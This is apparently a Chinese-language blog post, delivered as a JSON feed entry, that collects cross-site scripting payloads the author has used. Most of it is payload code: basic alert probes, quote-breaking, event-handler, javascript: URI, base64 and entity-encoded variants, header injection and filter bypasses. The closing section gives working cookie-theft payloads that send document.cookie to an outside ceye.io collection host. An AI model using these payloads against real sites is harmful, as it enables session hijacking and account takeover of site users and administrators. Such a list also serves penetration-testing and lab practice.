            "id": "https://starofeden.github.io/2023/08/31/%E7%94%A8%E8%BF%87%E7%9A%84xss-POC/",
            "url": "https://starofeden.github.io/2023/08/31/%E7%94%A8%E8%BF%87%E7%9A%84xss-POC/",
            "title": "用过的xss POC",
            "date_published": "2023-08-30T16:00:00.000Z",
            "content_html": "<h1 id=\"用过的xss-poc\"><a class=\"markdownIt-Anchor\" href=\"#用过的xss-poc\">#</a> 用过的 xss POC</h1>\n<h2 id=\"常见poc\"><a class=\"markdownIt-Anchor\" href=\"#常见poc\">#</a> 常见 poc</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class=\"line\">&lt;script&gt;confirm(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class=\"line\">&lt;script&gt;prompt(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"在属性中对引号闭合并注释掉后面的内容\"><a class=\"markdownIt-Anchor\" href=\"#在属性中对引号闭合并注释掉后面的内容\">#</a> 在属性中对引号闭合并注释掉后面的内容</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;//</span><br></pre></td></tr></table></figure>\n<h2 id=\"input标签特殊事件\"><a class=\"markdownIt-Anchor\" href=\"#input标签特殊事件\">#</a> input 标签特殊事件</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;onfocus=javascript:alert(&#x27;xss&#x27;) &gt;//</span><br></pre></td></tr></table></figure>\n<h2 id=\"对script标签和事件进行过滤但没有过滤javascript\"><a class=\"markdownIt-Anchor\" href=\"#对script标签和事件进行过滤但没有过滤javascript\">#</a> 对 script 标签和事件进行过滤，但没有过滤 JavaScript</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;a href=javascript:alert(&#x27;xss&#x27;) &gt; xss&lt;/a&gt;//</span><br></pre></td></tr></table></figure>\n<h2 id=\"data对字符进行编码\"><a class=\"markdownIt-Anchor\" href=\"#data对字符进行编码\">#</a> data: 对字符进行编码</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=</span><br></pre></td></tr></table></figure>\n<h2 id=\"html字符实体转换\"><a class=\"markdownIt-Anchor\" href=\"#html字符实体转换\">#</a> html 字符实体转换</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;//http://www.baidu.com</span><br></pre></td></tr></table></figure>\n<h2 id=\"输入框被隐藏\"><a class=\"markdownIt-Anchor\" href=\"#输入框被隐藏\">#</a> 输入框被隐藏</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">keyword=test&amp;t_link=&quot; type=&quot;text&quot; onmouseover=alert(1)// &amp; t_history=&quot; type=&quot;text&quot; onmouseover=alert(1)// &amp; t_sort=&quot; type=&quot;text&quot; onmouseover=alert(1)//</span><br></pre></td></tr></table></figure>\n<h2 id=\"bp抓包修改\"><a class=\"markdownIt-Anchor\" href=\"#bp抓包修改\">#</a> bp 抓包修改</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">referer: &quot; type=&quot;text&quot; onmouseover=alert(1)//</span><br></pre></td></tr></table></figure>\n<h2 id=\"ng-include\"><a class=\"markdownIt-Anchor\" href=\"#ng-include\">#</a> ng-include</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span><br></pre></td></tr></table></figure>\n<h2 id=\"格被编码为实体字符\"><a class=\"markdownIt-Anchor\" href=\"#格被编码为实体字符\">#</a> 格被编码为实体字符</h2>\n<ul>\n<li>空格用 %0a 替代</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img%0asrc=1%0aonerror=alert(1)&gt;</span><br><span class=\"line\">&lt;a%0Aonclick=&#x27;alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"获取cookie\"><a class=\"markdownIt-Anchor\" href=\"#获取cookie\">#</a> 获取 cookie</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"获得管理员cookie\"><a class=\"markdownIt-Anchor\" href=\"#获得管理员cookie\">#</a> 获得管理员 cookie</h2>\n<p>临时域名网站：<a href=\"http://ceye.io/profile\">http://ceye.io/profile</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">var img=document.createElement(&quot;img&quot;); img.src=&quot;http://q6d5hx.ceye.io/&quot;+document.cookie;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;!--这里gvipx6.ceye.io是上述网址产生的临时域名--&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>过滤了 script</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;body onload=&quot;window.open(&#x27;http://q6d5hx.ceye.io/&#x27;+document.cookie)&quot;&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>过滤了空格（用 /**/ 或 / 替换）</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;body/οnlοad=&quot;window.open(&#x27;http://q6d5hx.ceye.io/&#x27;+document.cookie)&quot;&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n",
